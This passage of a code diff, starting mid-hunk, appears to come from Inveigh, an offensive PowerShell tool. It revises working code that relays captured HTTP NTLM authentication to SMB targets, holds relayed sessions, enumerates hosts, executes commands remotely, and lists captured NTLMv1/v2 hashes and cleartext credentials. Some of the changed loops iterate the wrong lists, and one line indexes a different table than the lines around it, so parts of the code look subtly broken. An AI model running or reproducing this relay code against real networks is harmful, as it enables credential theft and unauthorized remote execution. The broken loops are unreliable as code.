         while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
         {
             Start-Sleep -m 10
-
             if(!$inveigh.relay_running)
             {
                 break HTTP_listener_loop
@@ -5109,7 +5506,6 @@ $HTTP_scriptblock =
             if($relay_reset -gt 2)
             {
                 $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay attack resetting") > $null
-                $client.Close()
                 $relay_step = 0
             }
 
@@ -5122,7 +5518,7 @@ $HTTP_scriptblock =
         if($HTTPS_listener)
         {
             
-            if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.relay_running)
+            if(!$HTTP_client.Connected -and $inveigh.relay_running)
             {
                 $HTTP_client = $HTTP_listener.AcceptTcpClient() 
 	            $HTTP_clear_stream = $HTTP_client.GetStream()
@@ -5146,7 +5542,7 @@ $HTTP_scriptblock =
 
             if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.relay_running)
             {
-                $HTTP_client = $HTTP_listener.AcceptTcpClient() 
+                $HTTP_client = $HTTP_listener.AcceptTcpClient()
 	            $HTTP_stream = $HTTP_client.GetStream()
             }
 
@@ -5251,7 +5647,7 @@ $HTTP_scriptblock =
                         $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type to SMB relay initiated by $HTTP_source_IP") > $null
                         $SMB_connect = Invoke-SMBConnect $process_ID_bytes $HTTP_source_IP
                         $target = $SMB_connect[1]
-                        $client = $SMB_connect[0]
+                        $SMB_client = $SMB_connect[0]
                         $HTTP_client_close = $false
                     
                         if(!$target)
@@ -5259,9 +5655,20 @@ $HTTP_scriptblock =
                             $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Eligible target not found") > $null
                             $relay_step = 0
                         }
-                        elseif(!$client.connected)
+                        elseif(!$SMB_client.connected)
                         {
-                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target is not responding") > $null
+
+                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                            {
+                
+                                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i]."Signing")
+                                {
+                                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target $target is not responding") > $null
+                                    break
+                                }
+                
+                            }
+                            
                             $relay_step = 0
                         }
                         else
@@ -5271,11 +5678,12 @@ $HTTP_scriptblock =
 
                         if($relay_step -eq 1)
                         {
-                            $SMB_relay_bytes = Invoke-SMBRelayChallenge $client $HTTP_request_bytes $SMB_version $process_ID_bytes
+                            $SMB_relay_bytes = Invoke-SMBRelayChallenge $SMB_client $HTTP_request_bytes $SMB_version $process_ID_bytes
 
                             if($SMB_relay_bytes.Length -le 3)
                             {
                                 $relay_step = 0
+                                $HTTP_client_close = $true
                                 $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                             }
 
@@ -5309,7 +5717,7 @@ $HTTP_scriptblock =
                     
                             $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                             $NTLM = 'NTLM ' + $NTLM_challenge_base64
-                            $NTLM_challenge = Invoke-SMBNTLMChallenge $SMB_relay_bytes
+                            $NTLM_challenge = Get-SMBNTLMChallenge $SMB_relay_bytes
                             $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge) > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
@@ -5431,92 +5839,12 @@ $HTTP_scriptblock =
                         }
 
                     }
-
-                    if($inveigh.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))
-                    {
-                        $session = ($HTTP_NTLM_user_string + "@" + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string).ToUpper()
-                        $hostname = ($HTTP_NTLM_host_string + "." + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string).ToUpper()
-                    }
-                    else
-                    {
-                        $session = $HTTP_username_full
-                    }
                     
-                    if($inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname})
+                    if($HTTP_NTLM_domain_string -and $HTTP_NTLM_user_string -and $HTTP_NTLM_host_string -and $HTTP_source_IP)
                     {
-                        $target_index = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $hostname} | Select-Object -expand Index -First 1
-                        [Array]$session_list = $inveigh.enumerated_data[$target_index].Sessions
-
-                        if($inveigh.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))
-                        {
-
-                            For($i = 0;$i -lt $session_list.Count;$i++)
-                            {
-                                $session_username = ($session_list[$i].Split("\"))[1]
-                                $session_update = $session_username + "@" + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string
-
-                                if($session_list[$i] -like "$HTTP_NTLM_domain_string\*")
-                                {
-                                    $session_list[$i] = $session_update
-                                    $inveigh.enumerated_data[$target_index].Sessions = $session_list
-                                }
-
-                            }
-
-                        }
-
-                        if($session_list -notcontains $session)
-                        {
-                            
-                            if($session_list)
-                            {
-                                $session_list += $session
-                            }
-                            else
-                            {
-                                [Array]$session_list = $session
-                            }
-
-                            $inveigh.enumerated_data[$target_index].Sessions = $session_list
-                        }
-
+                        Invoke-SessionUpdate $HTTP_NTLM_domain_string $HTTP_NTLM_user_string $HTTP_NTLM_host_string $HTTP_source_IP
                     }
-                    elseif($inveigh.enumerated_data | Where-Object {$_.IP -eq $HTTP_source_IP})
-                    {
-                        $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $HTTP_source_IP} | Select-Object -expand Index -First 1
-                        $inveigh.enumerated_data[$target_index].Hostname = $hostname
-                        $session_list = @($inveigh.enumerated_data[$target_index].Sessions)
 
-                        if($inveigh.domain_mapping_table.ContainsKey($HTTP_NTLM_domain_string))
-                        {
-
-                            For($i = 0;$i -lt $session_list.Count;$i++)
-                            {
-                                $session_username = ($session_list[$i].Split("\"))[1]
-                                $session_update = $session_username + "@" + $inveigh.domain_mapping_table.$HTTP_NTLM_domain_string
-
-                                if($session_entry -like "$HTTP_NTLM_domain_string\*")
-                                {
-                                    $session_list[$i] = $session_update
-                                    $inveigh.enumerated_data[$target_index].Sessions = $session_list
-                                }
-
-                            }
-
-                        }
-
-                        if($session_list -notcontains $session)
-                        {
-                            $session_list += $session
-                            $inveigh.enumerated_data[$target_index].Sessions = $session_list
-                        }
-
-                    }
-                    else
-                    {
-                        $inveigh.enumerated_data += New-RelayEnumObject -IP $HTTP_source_IP -Hostname $hostname -Session $session
-                    }
-                    
                     $HTTP_response_status_code = 0x32,0x30,0x30
                     $HTTP_response_phrase = 0x4f,0x4b
                     $HTTP_client_close = $true
@@ -5534,134 +5862,152 @@ $HTTP_scriptblock =
                                 if($inveigh.relay_failed_login_table.$HTTP_username_full.Count -le $FailedLoginThreshold)
                                 {
 
-                                    if(@($inveigh.session_list | Where-Object {$_.user -eq $HTTP_username_full -and $_.Status -eq 'connected'}).Count -lt $SessionLimitShare)
+                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
+                                    $SMB_relay_failed = Invoke-SMBRelayResponse $SMB_client $HTTP_request_bytes $SMB_version $SMB_user_ID $session_ID $process_ID_bytes
+                                    
+                                    if(!$SMB_relay_failed)
                                     {
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
-                                        $SMB_relay_failed = Invoke-SMBRelayResponse $client $HTTP_request_bytes $SMB_version $SMB_user_ID $session_ID $process_ID_bytes
-                                        
-                                        if(!$SMB_relay_failed)
-                                        {
-                                            $inveigh.session_current = $inveigh.session_count
-                                            $inveigh.session_message_ID_table.Add($inveigh.session_count,3)
+                                        $inveigh.session_current = $inveigh.session_count
+                                        $inveigh.session_message_ID_table.Add($inveigh.session_count,3)
 
-                                            if($Attack -contains 'Session')
+                                        if($Attack -contains 'Session')
+                                        {
+                                            
+                                            if($SMB_client.Connected)
                                             {
+                                                $inveigh.session_socket_table[$inveigh.session_count] = $SMB_client
+                                                $inveigh.session_table[$inveigh.session_count] = $session_ID
+                                                $inveigh.session_lock_table[$inveigh.session_count] = 'open'
+                                                $session_privilege = Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $true
+                                                $session_object = New-Object PSObject
+                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count
+                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $SMB_client.Client.RemoteEndpoint.Address.IPaddressToString
+                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Initiator $HTTP_source_IP
+                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $HTTP_username_full
                                                 
-                                                if($client.Connected)
+                                                if($session_privilege)
                                                 {
-                                                    $inveigh.session_socket_table[$inveigh.session_count] = $client
-                                                    $inveigh.session_table[$inveigh.session_count] = $session_ID
-                                                    $inveigh.session_lock_table[$inveigh.session_count] = 'open'
-                                                    $session_privilege = Invoke-SMBRelayExecute $client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $true
-                                                    $session_object = New-Object PSObject
-                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count
-                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $client.Client.RemoteEndpoint.Address.IPaddressToString
-                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Initiator $HTTP_source_IP
-                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $HTTP_username_full
-                                                    
-                                                    if($session_privilege)
-                                                    {
-                                                        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "yes"
-                                                    }
-                                                    else
-                                                    {
-                                                        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "no"
-                                                    }
+                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "yes"
+                                                }
+                                                else
+                                                {
+                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "no"
+                                                }
 
-                                                    if($client.Connected)
-                                                    {
-                                                        $status = "connected"
-                                                        Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status
-                                                        Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Established" $(Get-Date -format s)
-                                                        Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $(Get-Date -format s)
-                                                        $inveigh.session_list += $session_object
-                                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Session $($inveigh.session_count) added to session list") > $null
-                                                    }
-
+                                                if($SMB_client.Connected)
+                                                {
+                                                    $status = "connected"
+                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status
+                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Established" $(Get-Date -format s)
+                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $(Get-Date -format s)
+                                                    $inveigh.session += $session_object
+                                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Session $($inveigh.session_count) added to session list") > $null
                                                 }
 
                                             }
 
-                                            if($Attack -contains 'Enumerate' -or $Attack -contains 'Execute')
-                                            {
-                                                $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-                                                $filter_date = Get-Date
-                                            }
-
-                                            if(($attack -contains 'Enumerate' -and $client.Connected) -and
-                                            (!$inveigh.enumerated_data[$target_index].Enumerate -or
-                                            (New-TimeSpan $inveigh.enumerated_data[$target_index].Enumerate $filter_date).Minutes -gt $RepeatEnumerate))
-                                            {
-                                                Invoke-SMBRelayEnum $client $SMB_user_ID $session_ID $process_ID_bytes $Enumerate $EnumerateGroup
-                                            }
-
-                                            if((($session_privilege -and $Attack -contains 'Execute' -and $Attack -contains 'Session' -and $client.Connected) -or
-                                            ($Attack -contains 'Execute' -and $Attack -notcontains 'Session' -and $client.Connected)) -and
-                                            (!$inveigh.enumerated_data[$target_index].Execute -or (New-TimeSpan $inveigh.enumerated_data[$target_index].Execute $filter_date).Minutes -gt $RepeatExecute))
-                                            {
-                                                Invoke-SMBRelayExecute $client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $false
-                                                $inveigh.enumerated_data[$target_index].Execute = $(Get-Date -format s)
-                                            }
-
-                                            if(!$client.Connected)
-                                            {
-                                                $inveigh.session_list[$inveigh.session_count] | Where-Object {$_.Status = "disconnected"}
-                                            }
-
-                                            $inveigh.session_count++
                                         }
 
-                                        if($Attack -notcontains 'Session' -and !$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')
+                                        if($Attack -contains 'Enumerate' -or $Attack -contains 'Execute')
                                         {
 
-                                            if($Attack -contains 'Enumerate')
+                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                                             {
 
-                                                $targets_enumerate_complete = $inveigh.enumerated_data | Where-Object {$_.Enumerate} | Select-Object -expand IP
-
-                                                if($inveigh.target_list -and $targets_enumerated)
+                                                if($inveigh.enumerate[$i].IP -eq $target)
                                                 {
-                                                    $targets_enumerate_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_enumerate_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
+                                                    $target_index = $i
+                                                    break
                                                 }
 
                                             }
 
-                                            if($Attack -contains 'Execute')
+                                            $filter_date = Get-Date
+                                        }
+
+                                        if(($attack -contains 'Enumerate' -and $SMB_client.Connected) -and
+                                        (!$inveigh.enumerate[$target_index].Enumerate -or
+                                        (New-TimeSpan $inveigh.enumerate[$target_index].Enumerate $filter_date).Minutes -gt $RepeatEnumerate))
+                                        {
+                                            Invoke-SMBRelayEnum $SMB_client $SMB_user_ID $session_ID $process_ID_bytes $Enumerate $EnumerateGroup
+                                        }
+
+                                        if((($session_privilege -and $Attack -contains 'Execute' -and $Attack -contains 'Session' -and $SMB_client.Connected) -or
+                                        ($Attack -contains 'Execute' -and $Attack -notcontains 'Session' -and $SMB_client.Connected)) -and
+                                        (!$inveigh.enumerate[$target_index].Execute -or (New-TimeSpan $inveigh.enumerate[$target_index].Execute $filter_date).Minutes -gt $RepeatExecute))
+                                        {
+                                            Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $false
+                                            $inveigh.enumerate[$target_index].Execute = $(Get-Date -format s)
+                                        }
+
+                                        if(!$SMB_client.Connected)
+                                        {
+                                            $inveigh.session[$inveigh.session_count] | Where-Object {$_.Status = "disconnected"}
+                                        }
+
+                                        $inveigh.session_count++
+                                    }
+
+                                    if($Attack -notcontains 'Session' -and !$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')
+                                    {
+
+                                        if($Attack -contains 'Enumerate')
+                                        {
+
+                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                                             {
 
-                                                $targets_execute_complete = $inveigh.enumerated_data | Where-Object {$_.Execute} | Select-Object -expand IP
-
-                                                if($inveigh.target_list -and $targets_enumerated)
+                                                if($inveigh.enumerate[$i].Enumerate)
                                                 {
-                                                    $targets_execute_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_execute_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
+                                                    $targets_enumerate_complete = @($inveigh.enumerate[$i].IP)
                                                 }
 
                                             }
 
-                                            if($Attack -notcontains 'Session' -or (!$targets_enumerate_remaining -and $Attack -contains 'Enumerate' -and $Attack -notcontains 'Execute') -or
-                                            (!$targets_execute_remaining -and $Attack -contains 'Execute' -and $Attack -notcontains 'Enumerate') -or
-                                            (!$targets_enumerate_remaining -and !$targets_execute_remaining -and $Attack -contains 'Enumerate' -and $Attack -contains 'Execute'))
+                                            if($inveigh.target_list -and $targets_enumerated)
                                             {
-                                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
-                                                $inveigh.SMB_relay = $false
+                                                $targets_enumerate_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_enumerate_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                                             }
 
                                         }
 
-                                        $relay_step = 0
+                                        if($Attack -contains 'Execute')
+                                        {
+
+                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                                            {
+
+                                                if($inveigh.enumerate[$i].Execute)
+                                                {
+                                                    $targets_execute_complete = @($inveigh.execute[$i].IP)
+                                                }
+
+                                            }
+
+                                            if($inveigh.target_list -and $targets_enumerated)
+                                            {
+                                                $targets_execute_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_execute_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
+                                            }
+
+                                        }
+
+                                        if($Attack -notcontains 'Session' -or (!$targets_enumerate_remaining -and $Attack -contains 'Enumerate' -and $Attack -notcontains 'Execute') -or
+                                        (!$targets_execute_remaining -and $Attack -contains 'Execute' -and $Attack -notcontains 'Enumerate') -or
+                                        (!$targets_enumerate_remaining -and !$targets_execute_remaining -and $Attack -contains 'Enumerate' -and $Attack -contains 'Execute'))
+                                        {
+                                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
+                                            $inveigh.SMB_relay = $false
+                                        }
+
                                     }
-                                    else
-                                    {
-                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded session limit on $target") > $null
-                                        $client.Close()
-                                        $relay_step = 0
-                                    }
+
+                                    $relay_step = 0
 
                                 }
                                 else
                                 {
                                     $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded failed login limit") > $null
-                                    $client.Close()
+                                    $SMB_client.Close()
                                     $relay_step = 0
                                 }
 
@@ -5669,7 +6015,7 @@ $HTTP_scriptblock =
                             else
                             {
                                 $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_NTLM_user_string appears to be a machine account") > $null
-                                $client.Close()
+                                $SMB_client.Close()
                                 $relay_step = 0
                             }
 
@@ -5677,7 +6023,7 @@ $HTTP_scriptblock =
                         else
                         {
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list") > $null
-                            $client.Close()
+                            $SMB_client.Close()
                             $relay_step = 0
                         }
 
@@ -5771,10 +6117,20 @@ $HTTP_scriptblock =
         else
         {
 
-            if($HTTP_data_available -or $HTTP_connection_header_close)
+            if($HTTP_client_handle_old -eq $HTTP_client.Client.Handle)
+            {
+                $HTTP_reset++
+            }
+            else
+            {
+                $HTTP_reset = 0
+            }
+
+            if($HTTP_data_available -or $HTTP_connection_header_close -or $HTTP_reset -gt 20)
             {
                 $HTTP_client.Close()
                 $HTTP_client_close = $true
+                $HTTP_reset = 0
             }
             else
             {
@@ -5786,7 +6142,7 @@ $HTTP_scriptblock =
     }
 
     $HTTP_client.Close()
-    start-sleep -s 1
+    Start-sleep -s 1
     $HTTP_listener.Server.blocking = $false
     Start-Sleep -s 1
     $HTTP_listener.Server.Close()
@@ -5834,7 +6190,7 @@ $control_relay_scriptblock =
                 $certificate_store.Open('ReadWrite')
                 $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
 
-                ForEach($certificate in $certificates)
+                foreach($certificate in $certificates)
                 {
                     $certificate_store.Remove($certificate)
                 }
@@ -5859,31 +6215,32 @@ $control_relay_scriptblock =
             {
                 $error_message = $_.Exception.Message
                 $error_message = $error_message -replace "`n",""
-                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
             }
             
         }
 
         if($inveigh.ADIDNS -eq 'Combo' -and $inveigh.ADIDNS_table.Count -gt 0)
         {
+            $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
 
-            foreach($DNS_host in $inveigh.ADIDNS_table.Keys)
+            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
             {
  
-                if($inveigh.ADIDNS_table.$DNS_host -eq 1)
+                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
                 {
 
                     try
                     {
-                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $DNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone
+                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone
                         $inveigh.ADIDNS_table.$DNS_host = $null
                     }
                     catch
                     {
                         $error_message = $_.Exception.Message
                         $error_message = $error_message -replace "`n",""
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
-                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host (A) record for $DNS_host remove failed") > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host (A) record for $ADIDNS_host remove failed") > $null
                     }
 
                 }
@@ -6038,7 +6395,7 @@ $session_refresh_scriptblock =
 
             while($session -le $inveigh.session_socket_table.Count)
             {
-                $session_timespan =  New-TimeSpan $inveigh.session_list[$session]."Last Activity" $(Get-Date)
+                $session_timespan =  New-TimeSpan $inveigh.session[$session]."Last Activity" $(Get-Date)
                 
                 if($inveigh.session_socket_table[$session].Connected -and $inveigh.session_lock_table[$session] -eq 'open' -and $session_timespan.Minutes -ge $SessionRefresh)
                 {
@@ -6069,7 +6426,7 @@ $session_refresh_scriptblock =
                     catch
                     {
                         $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
-                        $inveigh.session_list[$session] | Where-Object {$_.Status = "disconnected"}
+                        $inveigh.session[$session] | Where-Object {$_.Status = "disconnected"}
                     }
 
                     if($inveigh.session_socket_table[$session].Connected)
@@ -6094,13 +6451,13 @@ $session_refresh_scriptblock =
                         catch
                         {
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
-                            $inveigh.session_list[$session] | Where-Object {$_.Status = "disconnected"}
+                            $inveigh.session[$session] | Where-Object {$_.Status = "disconnected"}
                         }
 
                     }
 
                     $inveigh.session_lock_table[$Session] = 'open'
-                    $inveigh.session_list[$Session] | Where-Object {$_."Last Activity" = Get-Date -format s}
+                    $inveigh.session[$Session] | Where-Object {$_."Last Activity" = Get-Date -format s}
                     $inveigh.session_message_ID_table[$Session] = $message_ID
                 }
 
@@ -6202,6 +6559,7 @@ function ControlRelayLoop
     $control_relay_powershell = [PowerShell]::Create()
     $control_relay_powershell.Runspace = $control_relay_runspace
     $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
+    $control_relay_powershell.AddScript($ADIDNS_functions_scriptblock) > $null
     $control_relay_powershell.AddScript($packet_functions_scriptblock) > $null
     $control_relay_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
     $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(
@@ -6365,8 +6723,9 @@ try
                 {
                     Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $inveigh.newline)
                     $inveigh.cleartext_list.Sort()
+                    $POST_request_list_temp = $inveigh.POST_request_list
 
-                    foreach($unique_cleartext in $inveigh.cleartext_list)
+                    foreach($unique_POST_request in $POST_request_list_temp)
                     {
                         if($unique_cleartext -ne $unique_cleartext_last)
                         {
@@ -6387,8 +6746,9 @@ try
                 {
                     Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $inveigh.newline)
                     $inveigh.POST_request_list.Sort()
+                    $NTLMv1_list_temp = $inveigh.NTLMv1_list
 
-                    foreach($unique_POST_request in $inveigh.POST_request_list)
+                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)
                     {
                         if($unique_POST_request -ne $unique_POST_request_last)
                         {
@@ -6405,8 +6765,9 @@ try
                 {
                     Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                     $inveigh.NTLMv1_list.Sort()
+                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list
 
-                    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
+                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                     {
                         $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
 
@@ -6421,8 +6782,9 @@ try
                     $unique_NTLMv1_account_last = ''
                     Start-Sleep -m 5
                     Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)
+                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list
 
-                    foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
+                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                     {
                         Write-Output($NTLMv1_username + $inveigh.newline)
                     }
@@ -6438,8 +6800,9 @@ try
                 {
                     Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                     $inveigh.NTLMv2_list.Sort()
+                    $NTLMv2_list_temp = $inveigh.NTLMv2_list
 
-                    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
+                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)
                     {
                         $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
 
@@ -6454,8 +6817,9 @@ try
                     $unique_NTLMv2_account_last = ''
                     Start-Sleep -m 5
                     Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)
+                    $NTLMv2_username_list_temp = $inveigh.NTLMv2_username_list
 
-                    foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
+                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)
                     {
                         Write-Output($NTLMv2_username + $inveigh.newline)
                     }
@@ -6537,10 +6901,10 @@ Get-Inveigh will get stored Inveigh data from memory.
 .PARAMETER Console
 Get queued console output. This is also the default if no parameters are set.
 
-.PARAMETER DNS
+.PARAMETER ADIDNS
 Get added DNS host records.
 
-.PARAMETER DNSFailed
+.PARAMETER ADIDNSFailed
 Get failed DNS host record adds.
 
 .PARAMETER Learning
@@ -6589,8 +6953,8 @@ Get relay session list.
         [parameter(Mandatory=$false)][Switch]$Cleartext,
         [parameter(Mandatory=$false)][Switch]$CleartextUnique,
         [parameter(Mandatory=$false)][Switch]$Console,
-        [parameter(Mandatory=$false)][Switch]$DNS,
-        [parameter(Mandatory=$false)][Switch]$DNSFailed,
+        [parameter(Mandatory=$false)][Switch]$ADIDNS,
+        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
         [parameter(Mandatory=$false)][Switch]$Learning,
         [parameter(Mandatory=$false)][Switch]$Log,
         [parameter(Mandatory=$false)][Switch]$NTLMv1,
@@ -6602,7 +6966,7 @@ Get relay session list.
         [parameter(Mandatory=$false)][Switch]$POSTRequest,
         [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
         [parameter(Mandatory=$false)][Switch]$Session,
-        [parameter(Mandatory=$false)][Switch]$Enumeration,
+        [parameter(Mandatory=$false)][Switch]$Enumerate,
         [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
     )
 
@@ -6643,30 +7007,32 @@ Get relay session list.
 
     }
 
-    if($DNS)
+    if($ADIDNS)
     {
+        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
 
-        foreach($DNS_host in $inveigh.ADIDNS_table.Keys)
+        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
         {
             
-            if($inveigh.ADIDNS_table.$DNS_host -eq 1)
+            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
             {
-                Write-Output $DNS_host
+                Write-Output $ADIDNS_host
             }
 
         }
 
     }
 
-    if($DNSFailed)
+    if($ADIDNSFailed)
     {
+        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
 
-        foreach($DNS_host in $inveigh.ADIDNS_table.Keys)
+        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
         {
             
-            if($inveigh.ADIDNS_table.$DNS_host -eq 0)
+            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 0)
             {
-                Write-Output $DNS_host
+                Write-Output $ADIDNS_host
             }
 
         }
@@ -6686,8 +7052,9 @@ Get relay session list.
     if($NTLMv1Unique)
     {
         $inveigh.NTLMv1_list.Sort()
+        $NTLMv1_list_temp = $inveigh.NTLMv1_list
 
-        foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
+        foreach($unique_NTLMv1 in $NTLMv1_list_temp)
         {
             $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))
 
@@ -6714,8 +7081,9 @@ Get relay session list.
     if($NTLMv2Unique)
     {
         $inveigh.NTLMv2_list.Sort()
+        $NTLMv2_list_temp = $inveigh.NTLMv2_list
 
-        foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
+        foreach($unique_NTLMv2 in $NTLMv2_list_temp)
         {
             $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))
 
@@ -6761,6 +7129,7 @@ Get relay session list.
 
     if($Session)
     {
